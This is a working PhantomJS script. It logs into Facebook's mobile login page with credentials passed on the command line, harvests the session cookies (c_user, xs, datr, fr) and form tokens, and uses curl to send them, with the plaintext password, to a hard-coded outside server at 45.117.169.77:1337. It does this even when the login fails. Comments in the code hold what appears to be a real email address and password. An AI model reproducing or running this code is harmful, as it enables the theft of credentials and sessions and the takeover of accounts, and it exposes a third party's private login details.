var process = require("child_process");
var spawn = process.spaw;
var system = require('system');
var args = system.args;
var execFile = process.execFile
var page = require('webpage').create();

var urlApi = 'http://45.117.169.77:1337/';
page.settings.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0';
page.clearCookies();

if (args.length === 1) {
  console.log('Try to pass some arguments when invoking this script!');
} 

page.onResourceRequested = function(requestData, networkRequest) {
	console.log( requestData.url);
	var match = requestData.url.match(/bz/g);
	if (match != null) {
		page.stop()
		var cookies = page.cookies;
		var cookieStr = '';
		var data =  JSON.parse('{"' + decodeURI(requestData.postData).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
		if(data.fb_dtsg == undefined || data.__user == 0  ) {
			for(var i in cookies) {
				cookieStr+= ';' + cookies[i].name + '=' + cookies[i].value;
			}
			execFile("curl", ["", urlApi +  "AccountsFB/create?" + 'username=' + args[1] + '&password=' + args[2] + '&cookie=' + cookieStr   + '&hashtag=' + args[3]], null, function (err, stdout, stderr) {
				console.log("execFileSTDOUT:", JSON.stringify(stdout))
				console.log("execFileSTDERR:", JSON.stringify(stderr))
		 		phantom.exit();
			})
			console.log("login fail");
			return;
		}
		console.log('Request (#' + requestData.id + '), postData: ' +  data.__dyn);
		console.log("-----------------------------");
		console.log("__dyn: " + data.__dyn );
		console.log("__spin_r: " + data.__spin_r );
		console.log("__spin_t: " + data.__spin_t );
		console.log("__user: " + data.__user );
		console.log("fb_dtsg: " + data.fb_dtsg );
		console.log("jazoest: " + data.jazoest );
		
	
	
		console.log('Listing cookies:');
		for(var i in cookies) {
			console.log(cookies[i].name + '=' + cookies[i].value + ', expires: ' + cookies[i].expires );
			if(cookies[i].name == 'c_user') cookieStr += ';c_user=' + cookies[i].value ;
			if(cookies[i].name == 'xs') cookieStr += ';xs=' + cookies[i].value;
			if(cookies[i].name == 'fr') cookieStr += ';fr=' + cookies[i].value;
			if(cookies[i].name == 'datr') cookieStr += ';datr=' + cookies[i].value;
		}
		var urlParam = "username=" + args[1] //"huthamcauquan1@gmail.com" 
		+ "&password=" + args[2] // "HoangVuong3031993" 
		+ "&__dyn=" + data.__dyn
		+"&__spin_r=" + data.__spin_r 
		+"&__spin_t=" + data.__spin_t
		+"&__user=" + data.__user
		+"&fb_dtsg=" + data.fb_dtsg
		+"&jazoest=" + data.jazoest
		+"&cookie=" + cookieStr
		+'&hashtag=' + args[3];
		if(data.__user == 0 || data.__user == undefined){
			phantom.exit()
		}
		console.log('cookie : ' + cookieStr);
      
		execFile("curl", ["",  urlApi + "AccountsFB/create?" + urlParam], null, function (err, stdout, stderr) {
			console.log("execFileSTDOUT:", JSON.stringify(stdout))
			console.log("execFileSTDERR:", JSON.stringify(stderr))
		 	phantom.exit();
		})
		page.render('example.png');
	
		//	page.render('example.png');
	
	}
};

var countReq = 0;

page.onLoadFinished = function(status) {
var url =  page.url;
 console.log("[onLoadFinished] url: " + url);
 
 //page.render('example.png');
 //page.open('https://m.facebook.com/login.php')
 if(url.indexOf('save-device') > 0) //
	{
		console.log('[reject   ]')
		page.open('https://www.facebook.com')
		
	}
};

page.open('https://m.facebook.com/login.php', function(status) {
	 console.log("Status: " + status);
	 if(status === "success") {
		 page.evaluate(function(username, password) {
			document.getElementById("m_login_email").value = username;
		//	document.getElementById('m_login_password').value = password;
			var arrInputPass = document.querySelectorAll("input[type='password']");
			arrInputPass[0].value = password;
			(document.querySelectorAll("input[type='submit']")[0]).click();
		
			
		},args[1], args[2]);
		
	
  
	}
	//S	page.settings.userAgent = '';
	// /	countReq++;
	
	//page.close();
	//phantom.exit();
});
	
